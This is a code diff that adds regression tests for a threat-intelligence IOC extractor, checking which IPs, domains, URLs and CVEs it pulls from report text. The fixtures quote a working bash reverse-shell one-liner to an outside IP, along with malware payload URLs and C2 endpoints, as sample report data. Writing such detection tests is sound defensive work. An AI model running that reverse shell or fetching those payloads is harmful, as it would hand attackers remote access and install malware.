@@ -242,3 +242,242 @@ def test_short_defanged_ip_evidence_centering():
     assert ips[0]["value"] == "1.1.1.1"
     # Evidence must contain the indicator and be centered around it, not just the start of line
     assert "1.1.1[.]1" in ips[0]["evidence"] or "1.1.1.1" in ips[0]["evidence"]
+
+
+# ------------------------------------------------------------------------------
+# Regression Tests for Sanity Audit Findings
+# ------------------------------------------------------------------------------
+
+def test_regression_ipv4_version_numbers_and_user_agents():
+    """
+    Ensures software version strings, product release numbers, and browser User-Agent
+    tokens are rejected while genuine adversary IPs (even in shell commands) are retained.
+    """
+    pages = [
+        {
+            "page_number": 1,
+            "page_text": (
+                "Observed User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.76\n"
+                "Reporting Database (RDB) version 2.0.0.1 and earlier are vulnerable.\n"
+                "Citrix ADC and Gateway version 13.0 all supported builds before 13.0.47.24\n"
+                "VMware Workspace ONE Access, versions 21.08.0.1, 21.08.0.0, 20.10.0.1, 20.10.0.0\n"
+                "Reverse shell executed: bash -i >& /dev/tcp/179.43.175.38/6870 0>&1\n"
+                "Attacker C2 connection from 200.172.238.135 established."
+            ),
+        }
+    ]
+    iocs = extract_iocs(pages)
+    ips = [i["value"] for i in iocs if i["type"] == "ipv4"]
+
+    # False positives must NOT be extracted
+    assert "116.0.0.0" not in ips
+    assert "2.0.0.1" not in ips
+    assert "13.0.47.24" not in ips
+    assert "20.10.0.1" not in ips
+    assert "20.10.0.0" not in ips
+
+    # Legitimate threat IPs MUST be extracted
+    assert "179.43.175.38" in ips
+    assert "200.172.238.135" in ips
+
+
+def test_regression_domain_file_extensions_and_configs():
+    """
+    Ensures script, template, certificate, and configuration file names are not extracted as domains.
+    """
+    pages = [
+        {
+            "page_number": 1,
+            "page_text": (
+                "Attacker uploaded web shells jtest.jsp, app.jsp, resource.aspx, and eval-stdin.php.\n"
+                "Configuration files system-config.properties, env.dist, and certificate fd86ald0.pem were read.\n"
+                "Transport script tcp-http.go was executed.\n"
+                "Active C2 communications: c2-node.safe-vpn.mobi and update.asyncfox.xyz"
+            ),
+        }
+    ]
+    iocs = extract_iocs(pages)
+    domains = [i["value"] for i in iocs if i["type"] == "domain"]
+
+    assert "jtest.jsp" not in domains
+    assert "app.jsp" not in domains
+    assert "resource.aspx" not in domains
+    assert "eval-stdin.php" not in domains
+    assert "system-config.properties" not in domains
+    assert "env.dist" not in domains
+    assert "fd86ald0.pem" not in domains
+    assert "tcp-http.go" not in domains
+
+    # Legitimate adversary domains MUST be extracted
+    assert "c2-node.safe-vpn.mobi" in domains
+    assert "update.asyncfox.xyz" in domains
+
+
+def test_regression_domain_method_calls_and_av_signatures():
+    """
+    Ensures programming language method invocations, code packages, and antivirus
+    threat detection names are not extracted as domain IOCs.
+    """
+    pages = [
+        {
+            "page_number": 1,
+            "page_text": (
+                "Insecure deserialization via JavaScriptSerializer.Deserialize() and xmlSerializer.Deserialize().\n"
+                "Executed socket.socket() and ate.utility.Execute(command).\n"
+                "Detection signatures: Trojan/Win64.Shelma, GrayWare/Win32.Rozena.j, TR/Crypt.XPACK.Gen7, and Vir.IT eXplorer.\n"
+                "Classification marking: CISA MAR-10430311.c1.v1.CLEAR.\n"
+                "Legitimate adversary domain: 149.248.35.200.sslip.io."
+            ),
+        }
+    ]
+    iocs = extract_iocs(pages)
+    domains = [i["value"] for i in iocs if i["type"] == "domain"]
+
+    assert "javascriptserializer.deserialize" not in domains
+    assert "xmlserializer.deserialize" not in domains
+    assert "socket.socket" not in domains
+    assert "ate.utility.execute" not in domains
+    assert "win64.shelma" not in domains
+    assert "win32.rozena" not in domains
+    assert "crypt.xpack" not in domains
+    assert "vir.it" not in domains
+    assert "mar-10430311.c1.v1.clear" not in domains
+
+    # Legitimate threat domain preserved
+    assert "149.248.35.200.sslip.io" in domains
+
+
+def test_regression_reference_urls_and_authorities():
+    """
+    Ensures benign government advisories, vendor bulletin URLs, and documentation
+    placeholders are filtered out, while malicious plain-text and defanged payload URLs are preserved.
+    """
+    pages = [
+        {
+            "page_number": 1,
+            "page_text": (
+                "For TLP details, consult http://www.cisa.gov/tlp.\n"
+                "Patch advisory: https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882.\n"
+                "NCSC Guidance: https://www.ncsc.gov.uk/guidance/mitigating-malware.\n"
+                "Example URL in documentation: http://www.example.com/test.html\n"
+                "Malware payload staged at hxxps://mc.rockylinux[.]si/seoforce/triggers/files/evil.txt\n"
+                "Mining binary retrieved from http://download.asyncfox.xyz/download/xmrig.x86_64\n"
+                "Direct C2 endpoint: http://45.95.147.236/tmp.x86_64"
+            ),
+        }
+    ]
+    iocs = extract_iocs(pages)
+    urls = [i["value"] for i in iocs if i["type"] == "url"]
+    domains = [i["value"] for i in iocs if i["type"] == "domain"]
+
+    # Benign reference URLs must be excluded
+    assert not any("cisa.gov" in u for u in urls)
+    assert not any("microsoft.com" in u for u in urls)
+    assert not any("ncsc.gov.uk" in u for u in urls)
+    assert not any("example.com" in u for u in urls)
+
+    # Authority domains must not be added to domain IOCs
+    assert "cisa.gov" not in domains
+    assert "www.cisa.gov" not in domains
+    assert "microsoft.com" not in domains
+    assert "www.ncsc.gov.uk" not in domains
+
+    # Legitimate threat URLs must be extracted
+    assert "https://mc.rockylinux.si/seoforce/triggers/files/evil.txt" in urls
+    assert "http://download.asyncfox.xyz/download/xmrig.x86_64" in urls
+    assert "http://45.95.147.236/tmp.x86_64" in urls
+
+
+def test_regression_cve_footnote_normalization():
+    """
+    Ensures CVE identifiers corrupted by superscript footnote concatenation in PDFs
+    (e.g. CVE-2024-938038 from footnote 38) are correctly normalized to the genuine CVE.
+    """
+    pages = [
+        {
+            "page_number": 1,
+            "page_text": (
+                "Lors d'un incident, un attaquant a corrigé lui-même les vulnérabilités "
+                "CVE-2024-8190, CVE-2024-8963 et CVE-2024-938038, après les avoir exploitées.\n"
+                "38 Vulnérabilités affectant les équipements Ivanti CSA."
+            ),
+        }
+    ]
+    iocs = extract_iocs(pages)
+    cves = [i["value"] for i in iocs if i["type"] == "cve"]
+
+    # Corrupted 6-digit identifier must be resolved
+    assert "CVE-2024-938038" not in cves
+    # Genuine CVEs must be present
+    assert "CVE-2024-8190" in cves
+    assert "CVE-2024-8963" in cves
+    assert "CVE-2024-9380" in cves
+
+
+def test_regression_platform_hosting_urls_and_ioc_drops():
+    """
+    Ensures platform-hosted URLs (GitHub, Pastebin) are properly handled:
+    - Defanged adversary tools in IOC listings (e.g. filemanager) are retained.
+    - Valid line-wrapped tool download endpoints (/releases/download) are reconstructed and retained.
+    - Raw payload URLs (/raw/, payload extensions) are retained.
+    - Trailing slash followed by unrelated prose is NOT appended.
+    - Trailing hyphens are NOT joined to unrelated next lines.
+    - Defanged platform URLs lacking threat/IOC context remain filtered.
+    - Ordinary undefanged documentation and repository references are filtered.
+    - Unrelated reference-domain filters (cisa.gov, etc.) remain intact.
+    """
+    pages = [
+        {
+            "page_number": 1,
+            "page_text": (
+                "Generic file managers dropped through eval-stdin.php:\n"
+                "hxxps://github[.]com/alexantr/filemanager\n"
+                "hxxps://github[.]com/prasathmani/tinyfilemanager\n"
+                "Observed tool download:\n"
+                "https://github[.]com/kost/\n"
+                "revsocks/releases/download\n"
+                "Raw payload staged at https://pastebin.com/raw/malware123\n"
+                "Executable payload: hxxp://raw.githubusercontent.com/user/repo/master/payload.php\n"
+                "Defender scanning tool: https://github.com/sl4cky/CVE-2018-7600-Masschecker/blob/master/Drupalgeddon-mass.py\n"
+                "Defense guidance: https://github.com/nsacyber/Mitigating-Web-Shells\n"
+                "Advisory link: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-016a\n"
+                "Adversary C2 endpoint: http://45.95.147.236/tmp.x86_64\n"
+                "Documentation link: hxxps://github[.]com/benign-org/docs\n"
+                "Archived documentation: https://github.com/project/docs/\n"
+                "This repository contains general documentation and developer guides.\n"
+                "Repository slug: https://github.com/project/repo-slug-\n"
+                "Next line contains unrelated release instructions."
+            ),
+        }
+    ]
+    iocs = extract_iocs(pages)
+    urls = [i["value"] for i in iocs if i["type"] == "url"]
+
+    # Defanged tool URLs in IOC sections MUST be retained
+    assert "https://github.com/alexantr/filemanager" in urls
+    assert "https://github.com/prasathmani/tinyfilemanager" in urls
+
+    # Reconstructed line-wrapped tool download URL MUST be retained
+    assert "https://github.com/kost/revsocks/releases/download" in urls
+
+    # Raw payload and binary URLs MUST be retained
+    assert "https://pastebin.com/raw/malware123" in urls
+    assert "http://raw.githubusercontent.com/user/repo/master/payload.php" in urls
+    assert "http://45.95.147.236/tmp.x86_64" in urls
+
+    # Trailing slash followed by unrelated prose MUST NOT append prose to URL
+    assert not any("docs/This" in u for u in urls)
+
+    # Trailing hyphen MUST NOT append next line to URL
+    assert not any("repo-slug-Next" in u for u in urls)
+
+    # Defanged platform URL lacking threat/IOC context MUST remain filtered
+    assert "https://github.com/benign-org/docs" not in urls
+
+    # Ordinary defensive tools and documentation references MUST be filtered
+    assert not any("sl4cky" in u for u in urls)
+    assert not any("nsacyber" in u for u in urls)
+
+    # Unrelated reference domain filters remain intact
+    assert not any("cisa.gov" in u for u in urls)
